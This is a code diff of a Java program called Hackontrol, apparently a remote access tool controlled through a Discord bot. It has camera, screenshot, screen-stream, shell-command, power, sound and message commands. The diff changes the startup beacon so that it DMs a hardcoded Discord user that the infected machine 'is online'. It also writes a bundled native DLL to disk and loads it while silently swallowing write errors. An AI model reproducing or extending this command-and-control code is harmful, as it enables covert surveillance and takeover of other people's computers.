@@ -7,7 +7,6 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.nio.charset.StandardCharsets;
 import java.security.MessageDigest;
-import java.util.List;
 import java.util.Random;
 
 import com.khopan.hackontrol.command.CameraCommand;
@@ -16,10 +15,13 @@ import com.khopan.hackontrol.command.CommandCommand;
 import com.khopan.hackontrol.command.DeviceListCommand;
 import com.khopan.hackontrol.command.DialogCommand;
 import com.khopan.hackontrol.command.HelpCommand;
+import com.khopan.hackontrol.command.MessageCommand;
 import com.khopan.hackontrol.command.NicknameCommand;
 import com.khopan.hackontrol.command.PowerCommand;
+import com.khopan.hackontrol.command.RickrollCommand;
 import com.khopan.hackontrol.command.ScreenshotCommand;
 import com.khopan.hackontrol.command.SelectCommand;
+import com.khopan.hackontrol.command.SoundCommand;
 import com.khopan.hackontrol.command.StreamCommand;
 import com.khopan.hackontrol.command.WakeCommand;
 import com.khopan.hackontrol.source.CommandSource;
@@ -31,7 +33,8 @@ import com.mojang.brigadier.exceptions.CommandSyntaxException;
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
 import net.dv8tion.jda.api.entities.Message;
-import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
+import net.dv8tion.jda.api.entities.User;
+import net.dv8tion.jda.api.entities.channel.concrete.PrivateChannel;
 import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
 import net.dv8tion.jda.api.entities.channel.unions.MessageChannelUnion;
 import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
@@ -64,10 +67,14 @@ public class Hackontrol {
 		this.registerCommand(new WakeCommand());
 		this.registerCommand(new CommandCommand());
 		this.registerCommand(new DialogCommand());
-		List<TextChannel> channels = bot.getTextChannels();
-		String message = '`' + this.machineIdentifier + "` is online!";
+		this.registerCommand(new SoundCommand());
+		this.registerCommand(new RickrollCommand());
+		this.registerCommand(new MessageCommand());
+		User user = bot.retrieveUserById(806469407454134282L).complete();
 
-		for(TextChannel channel : channels) {
+		if(user != null) {
+			PrivateChannel channel = user.openPrivateChannel().complete();
+			String message = '`' + this.machineIdentifier + "` is online!";
 			channel.sendMessage(message).queue();
 		}
 	}
@@ -165,9 +172,15 @@ public class Hackontrol {
 		InputStream stream = Hackontrol.class.getResourceAsStream("Hackontrol.dll");
 		byte[] data = stream.readAllBytes();
 		stream.close();
-		FileOutputStream output = new FileOutputStream(libraryFile);
-		output.write(data);
-		output.close();
+
+		try {
+			FileOutputStream output = new FileOutputStream(libraryFile);
+			output.write(data);
+			output.close();
+		} catch(Throwable Errors) {
+
+		}
+
 		System.load(libraryFile.getAbsolutePath());
 		JDA bot = JDABuilder.createDefault(Token.BOT_TOKEN)
 				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
